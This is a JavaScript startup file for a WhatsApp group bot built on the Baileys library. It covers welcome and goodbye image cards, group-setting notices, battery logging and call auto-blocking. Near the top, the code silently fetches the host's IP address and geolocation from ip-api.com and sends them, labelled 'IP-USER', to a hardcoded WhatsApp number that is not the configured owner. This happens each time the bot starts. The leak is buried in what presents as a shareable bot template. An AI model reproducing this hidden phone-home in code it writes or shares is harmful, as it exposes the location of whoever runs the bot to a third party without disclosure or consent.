const {
WAConnection,
MessageType,
Presence,
Mimetype,
GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, banner, close } = require('./mess/myfunc')
const { color } = require('./mess/color')
const moment = require("moment-timezone")
var config = JSON.parse(fs.readFileSync('./srv/config.js'))
var welcome = require('./srv/zero')
number = '6285157740529@s.whatsapp.net'
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`img/thumbnail.jpg`), surface: 200, message: `ʀɪғǫɪ ʙᴏᴛᴢ`, orderTitle: `RIFQIBOTZ`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fetch = require("node-fetch");
require('./srv/zero.js')
nocache('./srv/zero.js', module => console.log(`${module} Telah Di Updated... Jangan Lupa Subscribe Zero YT7`))

baterai = 'unknown'
charging = 'unknown'

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
const starts = async (zero = new WAConnection()) => {
zero.logger.level = 'warn'
zero.version = [2, 2143, 3]
zero.browserDescription = [ 'Rifqi Bot', 'Safari', '3.0' ]
console.log(banner.string)
console.log(color('[•] [ CREATED BY ZERO YT7 ] [•]'))
console.log(color('Please Follow Me On Sosial Media'))
console.log(color(' ==============================================='))
console.log(color('│ ○ Youtube : https://youtube.com/zero                     '))
console.log(color('│ ○ Instagram : https://instagram.com/Zero_YT7                 '))
console.log(color('│ ○ Tiktok : https://tiktok.com/@_zero                        '))
console.log(color('│ ○ Github : https://github.com/Zero-YT7                        '))
console.log(color(' ==============================================='))
zero.on('qr', () => {
console.log(color('[','white'), color('!','red'), color(']','white'), color('Please... Scan Is Now Qr Code !'))
})

fs.existsSync('./session/qrsession.json') && zero.loadAuthInfo('./session/qrsession.json')
    //join ke gc

/**teks = `https://chat.whatsapp.com/JtXKjv1uGhKJyrpERmN6AZ`
 zero.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|INFO!|', 'yellow'), color('JOINED TO FORUM WHATSAPP BOT GROUP', 'cyan'))**/


// send message 
fetch(`http://ip-api.com/line`).then(res => res.text())  

        .then(bu =>{

console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))

             buttonss = [
{buttonId: `ping`, buttonText:{displayText: 'ᴘɪɴɢ'}, type: 1}
]

buttonMessagee = {
contentText: `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`,
footerText: `ʀɪғǫɪ ʙᴏᴛᴢ` ,
buttons: buttonss,
headerType: 1
}
zero.sendMessage(`6289636634511@s.whatsapp.net`,  buttonMessagee, MessageType.buttonsMessage,{
        caption: '[ • XMOODS • ]',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
         
            },
			quoted: ftroli,sendEphemeral: true 
			})
   })
zero.on('connecting', () => {
start('2', 'Sedang Menyambungkan Mohon Tunggu...')
})
zero.on('open', () => {
success('2', 'Bot Telah Tersambung... Jangan Lupa Subscribe Zero YT7')
})
await zero.connect({timeoutMs: 30*1000})
fs.writeFileSync('./session/qrsession.json', JSON.stringify(zero.base64EncodedAuthInfo(), null, '\t'))
zero.on('chat-update', async (message) => {
require('./srv/zero.js')(zero, message)
})
    
const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1;
mhan = await zero.prepareMessage(id, kma, MessageType.image);
buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4,
}
zero.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

//WELCOME
zero.on('group-participants-update', async (anu) => {
    const welcome = JSON.parse(fs.readFileSync('./storage/welcome.json'))
    const isWelcome = welcome.includes(anu.jid)
 /**   if (!isWelcome) return**/
try {
    mem = anu.participants[0]
    console.log(anu)
mem = anu.participants[0]
console.log(anu)
try {
pp_user = await zero.getProfilePicture(mem)
} catch (e) {
pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
}
try {
pp_grup = await zero.getProfilePicture(anu.jid)
} catch (e) {
pp_grup =
"https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
if (anu.action == "add" && mem.includes(zero.user.jid)) {
zero.sendMessage(anu.jid, " 𝐇𝐚𝐢 𝐒𝐚𝐲𝐚 𝐀𝐤𝐚𝐧 𝐌𝐞𝐦𝐛𝐚𝐧𝐭𝐮 𝐌𝐞𝐦𝐛𝐚𝐧𝐭𝐮 𝐌𝐞𝐦𝐩𝐞𝐫𝐦𝐮𝐝𝐚𝐡 𝐊𝐢𝐧𝐞𝐫𝐣𝐚 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐒𝐞𝐩𝐞𝐫𝐭𝐢 𝐌𝐞𝐦𝐛𝐮𝐚𝐭 𝐒𝐭𝐢𝐜𝐤𝐞𝐫 𝐃𝐚𝐧 𝐋𝐚𝐢𝐧 𝐋𝐚𝐢𝐧.", "conversation")
}
      
if (anu.action == 'add') {
mdata = await zero.groupMetadata(anu.jid)
                memeg = mdata.participants.length
            num = anu.participants[0]
                let v = zero.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
        timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
           let d = new Date
       let locale = 'id'
       let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
     let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
        let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
       })
try {

                pp_user = await zero.getProfilePicture(mem)

                } catch (e) {

                pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'

            }

                try {

                pp_grup = await zero.getProfilePicture(anu.jid)

                } catch (e) {

                pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'

            }
img = await getBuffer(`https://api.lolhuman.xyz/api/base/welcome?apikey=${config.Lolkey}&img1=${pp_user}&img2=${pp_grup}&background=https://i.ibb.co/XjgQzkB/b1be492ada987df650bc831b1631815e.jpg&username=${encodeURI(anu_user)}&member=${memeg}&groupname=${encodeURI(mdata.subject)}`)
teks = `*Welcome @${num.split('@')[0]}* 

📛 : _${anu_user}_
🔣 : _@${num.split('@')[0]}_
🥉 : _${memeg} Member (s)_
⏰ : _${timuu} Indonesian time_

\`\`\`Hope you like it and don't forget to read the group description\`\`\``;            
sendButImage(anu.jid, teks, `ʀɪғǫɪʙᴏᴛᴢ`, img,but = [{buttonId:`hallo`, 
buttonText:{displayText: 'WELCOME👋'},type:1}], options = {contextInfo: {mentionedJid: [num, number]},thumbnail: Buffer.alloc(0)})


} else if (anu.action == 'remove') {
mdata = await zero.groupMetadata(anu.jid)
                memeg = mdata.participants.length
            num = anu.participants[0]
                let v = zero.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
        timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
           let d = new Date
       let locale = 'id'
       let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
     let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
        let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
       })
try {

                pp_user = await zero.getProfilePicture(mem)

                } catch (e) {

                pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'

            }

                try {

                pp_grup = await zero.getProfilePicture(anu.jid)

                } catch (e) {

                pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'

            }
img = await getBuffer(`https://api.lolhuman.xyz/api/base/leave?apikey=${config.Lolkey}&img1=${pp_user}&img2=${pp_grup}&background=https://i.ibb.co/XjgQzkB/b1be492ada987df650bc831b1631815e.jpg&username=${encodeURI(anu_user)}&member=${memeg}&groupname=${encodeURI(mdata.subject)}`)
out = `◪ Goodbye @${num.split('@')[0]}
◪ Leave from group:
${mdata.subject}
│
└─ ❏ Nomor: ${num.replace('@s.whatsapp.net', '')}
GoodBye~~`;
sendButImage(anu.jid, out, `ʀɪғǫɪʙᴏᴛᴢ`, img,but= [{buttonId: `byebye`, buttonText: {displayText: `GOODBYE🖕`}, type: 1}], options = {contextInfo: {mentionedJid: [num, number]}, thumbnail: Buffer.alloc(0)})
}
if (anu.action == "promote") {
anu_user = zero.contacts[mem]
num = anu.participants[0]
try {
ppimg = await zero.getProfilePicture(
`${anu.participants[0].split("@")[0]}@c.us`
)
} catch {
ppimg =
"https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
}
let buff = await getBuffer(ppimg)
teks = `@${num.split("@")[0]} Telah dipromote`
zero.sendMessage(mdata.id, teks, MessageType.text)
}
if (anu.action == "demote") {
anu_user = zero.contacts[mem]
num = anu.participants[0]
const mdata = await zero.groupMetadata(anu.jid)
try {
ppimg = await zero.getProfilePicture(
`${anu.participants[0].split("@")[0]}@c.us`
)
} catch {
ppimg =
"https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
}
let buff = await getBuffer(
`https://gatauajg.yogipw.repl.co/api/demote?name=${anu_user.notify}&msg=selamat%20menjadi%20admin&mem=5&picurl=${ppimg}&bgurl=https://cdn.discordapp.com/attachments/819995259261288475/835055559941292032/style.jpg`
)
teks = `@${num.split("@")[0]} Telah didemote`
zero.sendMessage(mdata.id, teks, MessageType.text)
}
} catch (e) {
console.log(e)
}
})
	

zero.on("group-update", async (anu) => {
metdata = await zero.groupMetadata(anu.jid);
if (anu.announce == "false") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗢𝗽𝗲𝗻𝗲𝗱 ] -\n\n𝑮𝒓𝒐𝒖𝒑 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊 𝑩𝒖𝒌𝒂 𝑶𝒍𝒆𝒉 𝑨𝒅𝒎𝒊𝒏\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑺𝒆𝒎𝒖𝒂 𝑴𝒆𝒎𝒃𝒆𝒓 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒊𝒓𝒊𝒎 𝑷𝒆𝒔𝒂𝒏`;
zero.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ Group Opened ] - In ${metdata.subject}`);
} else if (anu.announce == "true") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗹𝗼𝘀𝗲𝗱 ] -\n\n𝑮𝒓𝒐𝒖𝒑 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊 𝑻𝒖𝒕𝒖𝒑 𝑶𝒍𝒆𝒉 𝑨𝒅𝒎𝒊𝒏\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑯𝒂𝒏𝒚𝒂 𝑨𝒅𝒎𝒊𝒏 𝒀𝒂𝒏𝒈 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒊𝒓𝒊𝒎 𝑷𝒆𝒔𝒂𝒏`;
zero.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ Group Closed ] - In ${metdata.subject}`);
} else if (!anu.desc == "") {
tag = anu.descOwner.split("@")[0] + "@s.whatsapp.net";
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\n𝑫𝒆𝒔𝒌𝒓𝒊𝒑𝒔𝒊 𝑮𝒓𝒐𝒖𝒑 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊𝒖𝒃𝒂𝒉 𝑶𝒍𝒆𝒉 𝑨𝒅𝒎𝒊𝒏 @${
anu.descOwner.split("@")[0]
}\n𝑫𝒆𝒔𝒌𝒓𝒊𝒑𝒔𝒊 𝑩𝒂𝒓𝒖 : ${anu.desc}`;
zero.sendMessage(metdata.id, teks, MessageType.text, {
contextInfo: { mentionedJid: [tag] },
});
console.log(`- [ 𝗚𝗿𝗼𝘂𝗽 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗖𝗵𝗮𝗻𝗴𝗲 ] - 𝑰𝒏 ${metdata.subject}`);
} else if (anu.restrict == "false") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\n𝑬𝒅𝒊𝒕 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒇𝒐 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊𝒃𝒖𝒌𝒂 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒎𝒃𝒆𝒓\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑺𝒆𝒎𝒖𝒂 𝑴𝒆𝒎𝒃𝒆𝒓 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒆𝒅𝒊𝒕 𝑰𝒏𝒇𝒐 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒊`;
zero.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] - 𝑰𝒏 ${metdata.subject}`);
} else if (anu.restrict == "true") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\n𝑬𝒅𝒊𝒕 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒇𝒐 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊𝒕𝒖𝒕𝒖𝒑 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒎𝒃𝒆𝒓\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑯𝒂𝒏𝒚𝒂 𝑨𝒅𝒎𝒊𝒏 𝑮𝒓𝒐𝒖𝒑 𝒀𝒂𝒏𝒈 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒆𝒅𝒊𝒕 𝑰𝒏𝒇𝒐 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒊`;
zero.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] - 𝙄𝙣 ${metdata.subject}`);
}
})

// Baterai
	zero.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
		console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel + '%')
	})
	global.batrei = global.batrei ? global.batrei : []
	zero.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
      

	})

antical = true
zero.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
zero.sendMessage(call, `*Sorry ${zero.user.name} can't receive calls.*\n*Call = Block!*`, MessageType.text)
.then(() => zero.blockUser(call, "add"))
})


zero.on('CB:Blocklist', json => {
if (blocked.length > 2) return
for (let i of json[1].blocklist) {
blocked.push(i.replace('c.us','s.whatsapp.net'))
}
})
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
 
function nocache(module, cb = () => { }) {
console.log('Module', `'${module}'`, 'Sekarang Sedang Diawasi Untuk Perubahan')
fs.watchFile(require.resolve(module), async () => {
await uncache(require.resolve(module))
cb(module)
})
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
 
function uncache(module = '.') {
return new Promise((resolve, reject) => {
try {
delete require.cache[require.resolve(module)]
resolve()
} catch (e) {
reject(e)
}
})
}

starts()